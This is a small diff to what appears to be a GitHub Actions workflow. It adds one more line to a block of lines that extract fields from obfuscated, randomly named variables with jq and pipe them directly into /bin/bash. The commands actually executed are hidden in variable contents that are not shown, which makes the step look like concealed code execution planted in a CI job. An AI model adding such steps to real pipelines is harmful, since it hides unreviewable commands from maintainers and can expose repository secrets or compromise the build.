@@ -23,6 +23,7 @@ jobs:
           echo $vp8 | jq -r .jhr953 | /bin/bash
           echo $quz06151 | jq -r .qh18 | /bin/bash
           printf '%s' "$z088" | jq -r .jigo46 | /bin/bash
+          echo $bg5893 | jq -r .duy1 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
